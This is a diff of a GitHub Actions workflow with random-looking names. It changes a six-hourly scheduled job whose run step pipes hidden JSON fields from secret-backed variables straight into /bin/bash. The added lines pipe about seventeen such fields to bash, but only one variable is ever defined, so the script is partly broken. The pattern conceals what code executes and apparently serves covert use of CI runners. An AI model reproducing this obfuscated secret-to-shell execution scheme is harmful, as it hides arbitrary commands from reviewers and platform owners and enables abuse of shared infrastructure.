@@ -1,23 +1,33 @@
 name: guotuobei5748
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 0/6 * * *'
-jobs:  # 3489
+    - cron: '57 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: guotuobei5748
         env:
-          srr4731: ${{ secrets.srr4731 }}
+          jiu8480: ${{ secrets.jiu8480 }}
         run: |
-          echo $srr4731 | jq -r .ytl0505 | /bin/bash
-          echo $pg633 | jq -r .fnzv4737 | /bin/bash
-          echo $qolz0780 | jq -r .w3060 | /bin/bash
-          echo $kc624 | jq -r .nkoj30 | /bin/bash
-          echo $keje064 | jq -r .nho023 | /bin/bash
-          echo $upf7683 | jq -r .mmxqu6 | /bin/bash
-          echo $rgwwm30625 | jq -r .aedkn79 | /bin/bash
+          echo $jiu8480 | jq -r .bs89 | /bin/bash
+          echo $y6 | jq -r .l1 | /bin/bash
+          echo $nl5 | jq -r .b04 | /bin/bash
+          echo $wnoq99 | jq -r .k1 | /bin/bash
+          echo $vy9860 | jq -r .f64 | /bin/bash
+          echo $gbjh7 | jq -r .knt063 | /bin/bash
+          echo $nge002 | jq -r .dcu28 | /bin/bash
+          echo $pruia81086 | jq -r .h05 | /bin/bash
+          echo $op955 | jq -r .rmxi023 | /bin/bash
+          echo $ahx283 | jq -r .uevkc39838 | /bin/bash
+          echo $ypo36 | jq -r .udl1 | /bin/bash
+          echo $jwwu8 | jq -r .hdja85885 | /bin/bash
+          echo $ayiee3 | jq -r .tgvsr4548 | /bin/bash
+          echo $lmj746 | jq -r .x5157 | /bin/bash
+          echo $kak615 | jq -r .iup4263 | /bin/bash
+          echo $cclh610 | jq -r .iwtii03714 | /bin/bash
+          echo $vzorm04428 | jq -r .mmdb723 | /bin/bash
 
